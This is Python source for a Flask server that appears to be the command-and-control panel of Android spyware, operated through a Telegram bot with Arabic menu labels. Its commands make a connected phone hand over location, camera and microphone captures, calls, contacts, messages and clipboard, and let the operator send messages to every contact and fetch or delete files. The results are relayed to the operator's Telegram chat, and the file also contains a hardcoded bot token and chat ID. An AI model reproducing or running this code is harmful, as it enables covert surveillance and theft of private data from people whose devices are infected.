from flask import Flask, request, jsonify, send_from_directory
import requests
import os
import threading
import time
import json

app = Flask(__name__, static_folder='.', static_url_path='')

BOT_TOKEN = os.environ.get('BOT_TOKEN', '8175556330:AAGP0GZf10h0H_Fc10NJAbKJpP-zOH0xFwM')
ADMIN_CHAT_ID = os.environ.get('ADMIN_CHAT_ID', '658962728')

pending_commands = []

MAIN_BUTTONS = [
    [{"text": "📱 معلومات الجهاز", "callback_data": "/device_info"},
     {"text": "📍 الموقع", "callback_data": "/location"}],
    [{"text": "📷 الكاميرا الرئيسية", "callback_data": "/main_camera"},
     {"text": "🤳 كاميرا السيلفي", "callback_data": "/selfie_camera"}],
    [{"text": "🎤 الميكروفون", "callback_data": "/microphone"},
     {"text": "📞 المكالمات", "callback_data": "/calls"}],
    [{"text": "👥 جهات الاتصال", "callback_data": "/contacts"},
     {"text": "💬 الرسائل", "callback_data": "/messages"}],
    [{"text": "📤 إرسال رسالة", "callback_data": "/send_message"},
     {"text": "📢 إرسال للجميع", "callback_data": "/send_all"}],
    [{"text": "📋 الحافظة", "callback_data": "/clipboard"},
     {"text": "📳 الاهتزاز", "callback_data": "/vibrate"}],
    [{"text": "🔔 إشعار", "callback_data": "/notification"},
     {"text": "🔊 تشغيل صوت", "callback_data": "/play_audio"}],
    [{"text": "⏹ إيقاف الصوت", "callback_data": "/stop_audio"},
     {"text": "📥 جلب ملف", "callback_data": "/get_file"}],
    [{"text": "🗑 حذف ملف", "callback_data": "/delete_file"},
     {"text": "📦 التطبيقات", "callback_data": "/apps"}],
]

def send_telegram_message(chat_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        requests.post(url, json=payload, timeout=10)
    except Exception as e:
        print(f"خطأ: {e}")

def show_main_menu(chat_id):
    reply_markup = {"inline_keyboard": MAIN_BUTTONS}
    message = "🤖 <b>لوحة التحكم الرئيسية</b>\n\n📱 <b>الجهاز:</b> HUAWEI BKK-LX2\n🟢 <b>الحالة:</b> متصل\n\n⬇️ <b>اختر أمراً:</b>"
    send_telegram_message(chat_id, message, reply_markup)

@app.route('/')
def home():
    return send_from_directory('.', 'index.html')

@app.route('/send-to-bot', methods=['POST'])
def send_to_bot():
    try:
        data = request.json
        message_text = data.get('message', 'رسالة بدون نص')
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {"chat_id": ADMIN_CHAT_ID, "text": f"📱 <b>من التطبيق:</b>\n{message_text}", "parse_mode": "HTML"}
        response = requests.post(url, json=payload)
        if response.status_code == 200:
            return jsonify({"status": "success"})
        else:
            return jsonify({"status": "error"}), 500
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/get-commands', methods=['GET'])
def get_commands():
    try:
        device_id = request.args.get('device_id', 'all')
        commands = [cmd for cmd in pending_commands]
        pending_commands.clear()
        return jsonify({"commands": commands})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/send-result', methods=['POST'])
def send_result():
    try:
        data = request.json
        result = data.get('result', 'لا نتيجة')
        command = data.get('command', 'غير محدد')
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {"chat_id": ADMIN_CHAT_ID, "text": f"✅ <b>نتيجة الأمر:</b> {command}\n\n{result}", "parse_mode": "HTML"}
        requests.post(url, json=payload)
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

def listen_to_bot():
    last_update_id = 0
    while True:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={last_update_id + 1}&timeout=30"
            response = requests.get(url, timeout=35)
            if response.status_code == 200:
                data = response.json()
                if data.get('ok') and data.get('result'):
                    for update in data['result']:
                        last_update_id = update['update_id']
                        if 'message' in update:
                            message = update['message']
                            chat_id = message['chat']['id']
                            text = message.get('text', '')
                            if str(chat_id) == str(ADMIN_CHAT_ID):
                                if text == '/start' or text == 'ابدأ':
                                    show_main_menu(chat_id)
                                elif text.startswith('/'):
                                    command = {'id': last_update_id, 'command': text, 'timestamp': time.time()}
                                    pending_commands.append(command)
                                    send_telegram_message(chat_id, f"⏳ تم إرسال الأمر: {text}")
                        elif 'callback_query' in update:
                            callback = update['callback_query']
                            chat_id = callback['message']['chat']['id']
                            data_callback = callback['data']
                            if str(chat_id) == str(ADMIN_CHAT_ID):
                                command = {'id': last_update_id, 'command': data_callback, 'timestamp': time.time()}
                                pending_commands.append(command)
                                url_confirm = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
                                payload_confirm = {"callback_query_id": callback['id'], "text": f"⏳ جاري تنفيذ: {data_callback}", "show_alert": False}
                                requests.post(url_confirm, json=payload_confirm)
                                send_telegram_message(chat_id, f"⚙️ <b>جاري التنفيذ:</b>\n{data_callback}\n\n⏳ انتظر النتيجة...")
        except Exception as e:
            print(f"خطأ: {e}")
            time.sleep(5)

bot_thread = threading.Thread(target=listen_to_bot, daemon=True)
bot_thread.start()

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
